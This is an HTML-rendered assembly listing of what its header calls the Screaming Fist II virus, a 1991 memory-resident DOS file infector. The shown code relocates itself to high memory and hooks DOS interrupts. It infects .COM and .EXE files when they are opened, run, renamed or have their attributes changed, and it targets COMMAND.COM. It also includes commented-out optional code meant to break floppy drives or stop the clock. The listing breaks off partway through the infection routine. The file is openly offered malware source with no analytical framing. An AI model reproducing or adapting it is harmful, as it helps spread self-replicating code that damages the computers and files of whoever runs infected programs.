<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>SCREAMII.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">


</span><span class="sc1">; The Screaming Fist II virus (c)1991 by Lazarus Long, Inc.</span><span class="sc0">
</span><span class="sc1">;  The author assumes no responsibility for any damage incurred</span><span class="sc0">
</span><span class="sc1">;  from the infection caused by this virus</span><span class="sc0">

</span><span class="sc5">CURTAIN_OPEN</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">ARE_WE_RESIDENT?</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">CLD</span><span class="sc0">                                 </span><span class="sc1">;Do not remove this</span><span class="sc0">
 </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">DECRYPT_US</span><span class="sc0">

</span><span class="sc5">NEXT_PLACE</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">30H</span><span class="sc0">                          </span><span class="sc1">;Get DOS version</span><span class="sc0">
 </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
 </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;Lower than 2?</span><span class="sc0">
 </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">LEAVE_AND_RESTORE</span><span class="sc0">               </span><span class="sc1">;Yes,exit</span><span class="sc0">
 </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
 </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                              </span><span class="sc1">;Will return AX=0 if virus is resident</span><span class="sc0">
 </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
 </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                            </span><span class="sc1">;Are we resident?</span><span class="sc0">
 </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">LEAVE_AND_RESTORE</span><span class="sc0">                </span><span class="sc1">;If not, install</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
 </span><span class="sc6">XOR</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                          </span><span class="sc1">;Now make DS=0</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
 </span><span class="sc6">DEC</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">413H</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Decrease available memory by 1k</span><span class="sc0">
 </span><span class="sc6">LDS</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc2">0084</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;Get INT 21 vector and save it</span><span class="sc0">
 </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">OLD_21_BX</span><span class="sc4">-</span><span class="sc5">NEXT_PLACE</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
 </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">OLD_21_ES</span><span class="sc4">-</span><span class="sc5">NEXT_PLACE</span><span class="sc4">],</span><span class="sc8">DS</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">                          </span><span class="sc1">;Get address of our memory block</span><span class="sc0">
 </span><span class="sc6">DEC</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
 </span><span class="sc6">SUB</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0003</span><span class="sc4">],</span><span class="sc2">80H</span><span class="sc0">           </span><span class="sc1">;Decrease memory allocated to this program</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">0012</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;Decrease total memory</span><span class="sc0">
 </span><span class="sc6">SUB</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                        </span><span class="sc1">;By 80 paragraphs</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc2">0012</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;And save it again</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                          </span><span class="sc1">;Also gives us ES=Top of memory</span><span class="sc0">
 </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">                             </span><span class="sc1">;CS=DS</span><span class="sc0">
 </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">SUB</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEXT_PLACE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">    </span><span class="sc1">;Offset of code to move</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">                        </span><span class="sc1">;ES:100h is destination</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">LENGTH</span><span class="sc0">                      </span><span class="sc1">;Move entire virus</span><span class="sc0">
 </span><span class="sc6">REPZ</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">                          </span><span class="sc1">;Move entire virus to top of memory</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                          </span><span class="sc1">;DS=0</span><span class="sc0">
 </span><span class="sc6">CLI</span><span class="sc0">                                 </span><span class="sc1">;Disable interrupts</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc2">0086</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0084</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_21</span><span class="sc0">  </span><span class="sc1">;Set INT 21 to our code in high memory</span><span class="sc0">
 </span><span class="sc6">STI</span><span class="sc0">                                 </span><span class="sc1">;Enable interrupts</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3DFFH</span><span class="sc0">                        </span><span class="sc1">;Code to infect command processor</span><span class="sc0">
 </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
 </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">                              </span><span class="sc1">;DS=ES</span><span class="sc0">
 </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
 </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

</span><span class="sc5">LEAVE_AND_RESTORE</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc1">;PUSH DS                            This is just some silly code</span><span class="sc0">
 </span><span class="sc1">;XOR AX,AX                          That will cause random problems</span><span class="sc0">
 </span><span class="sc1">;MOV DS,AX                          Like floppies not working</span><span class="sc0">
 </span><span class="sc1">;IN AL,21H                          Or the system clock stopping</span><span class="sc0">
 </span><span class="sc1">;XOR AL,[046CH]B                    If you want to use it</span><span class="sc0">
 </span><span class="sc1">;AND AL,0FDH                        Just remove the semi-colons</span><span class="sc0">
 </span><span class="sc1">;OUT 21H,AL</span><span class="sc0">
 </span><span class="sc1">;POP DS</span><span class="sc0">

 </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEXT_PLACE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
 </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">LEAVE_EXE</span><span class="sc0">                            </span><span class="sc1">;A zero BP means we're leaving an .EXE</span><span class="sc0">
 </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">ORIGINAL_EIGHT</span><span class="sc4">-</span><span class="sc5">NEXT_PLACE</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Restore original eight bytes so</span><span class="sc0">
                                         </span><span class="sc1">;we can RET to them</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">
 </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                                 </span><span class="sc1">;Restore first four bytes</span><span class="sc0">
 </span><span class="sc6">MOVSW</span><span class="sc0">
 </span><span class="sc6">MOVSW</span><span class="sc0">
 </span><span class="sc6">RET</span><span class="sc0">                                     </span><span class="sc1">;And return to 100</span><span class="sc0">

</span><span class="sc5">LEAVE_EXE</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">                               </span><span class="sc1">;Use ES for a displacment value</span><span class="sc0">
 </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">OLD_CS_DISP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">            </span><span class="sc1">;Fix up the CS value</span><span class="sc0">
 </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">OLD_SS_DISP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">            </span><span class="sc1">;And the SS value</span><span class="sc0">

 </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OLD_SS_WORD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">;Set the correct SS</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OLD_SP_WORD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">;And the correct SP</span><span class="sc0">
 </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">                         </span><span class="sc1">;Necessary for .EXE's to run right</span><span class="sc0">
                                 </span><span class="sc1">;DO NOT REMOVE! IF YOU DO, .EXE's WON'T RUN!</span><span class="sc0">

</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">0EAH</span><span class="sc4">,</span><span class="sc0">                        </span><span class="sc1">;Makes a far jump to the original .EXE</span><span class="sc0">
                                 </span><span class="sc1">;Entry point</span><span class="sc0">

</span><span class="sc5">ORIGINAL_EIGHT</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">OLD_IP</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc0">     </span><span class="sc1">;.COM file beginning stored here</span><span class="sc0">

</span><span class="sc5">OLD_CS_DISP</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">OLD_SS_DISP</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">OLD_SS_WORD</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">           </span><span class="sc1">;Save old SS here</span><span class="sc0">

</span><span class="sc5">OLD_SP</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">OLD_SP_WORD</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">           </span><span class="sc1">;And old SP here</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">;Here is where the resident part begins in high memory.                        ;</span><span class="sc0">
</span><span class="sc1">;On systems with 640k, this is usually at segment 9F80                         ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">

</span><span class="sc5">NEW_21</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">PUSHF</span><span class="sc0">
 </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">                   </span><span class="sc1">;AX=FFFF means a program is asking</span><span class="sc0">
 </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">CONTINUE_ASKING</span><span class="sc0">             </span><span class="sc1">;If the virus is resident</span><span class="sc0">

 </span><span class="sc6">POPF</span><span class="sc0">                            </span><span class="sc1">;Return to show that virus is resident</span><span class="sc0">
 </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                          </span><span class="sc1">;Return AX=0 to show that we are resident</span><span class="sc0">
 </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">CONTINUE_ASKING</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Infect files on:</span><span class="sc0">
 </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3DH</span><span class="sc0">            </span><span class="sc1">;Opening</span><span class="sc0">
 </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">OPENING</span><span class="sc0">
 </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc0">            </span><span class="sc1">;Running</span><span class="sc0">
 </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">INFECT_REGULAR</span><span class="sc0">
 </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">43H</span><span class="sc0">            </span><span class="sc1">;Chmod</span><span class="sc0">
 </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">INFECT_REGULAR</span><span class="sc0">
 </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">56H</span><span class="sc0">            </span><span class="sc1">;Renaming</span><span class="sc0">
 </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">INFECT_REGULAR</span><span class="sc0">

 </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">OUTTA_HERE</span><span class="sc0">

</span><span class="sc5">OPENING</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">                     </span><span class="sc1">;Do we need to infect command processor?</span><span class="sc0">
 </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">INFECT_REGULAR</span><span class="sc0">              </span><span class="sc1">;Nope, continue</span><span class="sc0">

 </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">                         </span><span class="sc1">;DS=CS</span><span class="sc0">
 </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
 </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">COMMAND</span><span class="sc0">           </span><span class="sc1">;If so, let's use C:\COMMAND.COM</span><span class="sc0">

</span><span class="sc5">COM_FILE</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">DISEASE</span><span class="sc0">
 </span><span class="sc6">POPF</span><span class="sc0">
 </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">INFECT_REGULAR</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                         </span><span class="sc1">;Save AX</span><span class="sc0">
 </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">CHECK_NAME</span><span class="sc0">                 </span><span class="sc1">;Is DS:DX a .COM or an .EXE file?</span><span class="sc0">
 </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                        </span><span class="sc1">;A non-zero AX means nope</span><span class="sc0">
 </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">OUT_WITH_POP</span><span class="sc0">
 </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">DISEASE</span><span class="sc0">                    </span><span class="sc1">;Infect file</span><span class="sc0">

</span><span class="sc5">OUT_WITH_POP</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                          </span><span class="sc1">;Restore AX</span><span class="sc0">
</span><span class="sc5">OUTTA_HERE</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">POPF</span><span class="sc0">                            </span><span class="sc1">;Continue with old INT 21</span><span class="sc0">

</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">0EAH</span><span class="sc4">,</span><span class="sc0">                        </span><span class="sc1">;Code for a JMP FAR</span><span class="sc0">

</span><span class="sc5">OLD_21_BX</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">;Old Int 21 location is stored here</span><span class="sc0">
</span><span class="sc5">OLD_21_ES</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">FUNCTION</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;Used by virus to call old INT 21</span><span class="sc0">
 </span><span class="sc6">PUSHF</span><span class="sc0">
 </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD_21_BX</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">;This portion handles the actual infection process                             ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc5">DISEASE</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                           </span><span class="sc1">;Save all registers</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">ABOVE_2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD_DS</span><span class="sc4">]</span><span class="sc5">W</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">               </span><span class="sc1">;Save DS</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD_ES</span><span class="sc4">]</span><span class="sc5">W</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">               </span><span class="sc1">;Save ES</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">                           </span><span class="sc1">;CS=DS=ES</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3524H</span><span class="sc0">                      </span><span class="sc1">;Get INT 24 address</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OLD_24_BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;Save it</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OLD_24_ES</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">25H</span><span class="sc0">                        </span><span class="sc1">;Now set it to our own code</span><span class="sc0">
         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_24</span><span class="sc0">              </span><span class="sc1">;Offset of our INT 24 code</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">36H</span><span class="sc0">                      </span><span class="sc1">;Get disk free space</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">                       </span><span class="sc1">;And quit if less than virus length</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">NEED_TO_LEAVE</span><span class="sc0">
         </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">SET_ATTRIBS</span><span class="sc0">
         </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
         </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">LENGTH</span><span class="sc0">
         </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">SET_ATTRIBS</span><span class="sc0">

</span><span class="sc5">NEED_TO_LEAVE</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">;Clear stack</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DONE</span><span class="sc0">                    </span><span class="sc1">;And return</span><span class="sc0">


</span><span class="sc5">SET_ATTRIBS</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc5">OLD_DS</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">                </span><span class="sc1">;Get the attributes</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD_ATTRIBS</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">     </span><span class="sc1">;Save them for later</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">                   </span><span class="sc1">;Set attribs to normal</span><span class="sc0">
         </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">LEAVE_WITH_ATTRIBS</span><span class="sc0">           </span><span class="sc1">;Leave if error</span><span class="sc0">

</span><span class="sc5">OPEN_IT</span><span class="sc4">:</span><span class="sc0">
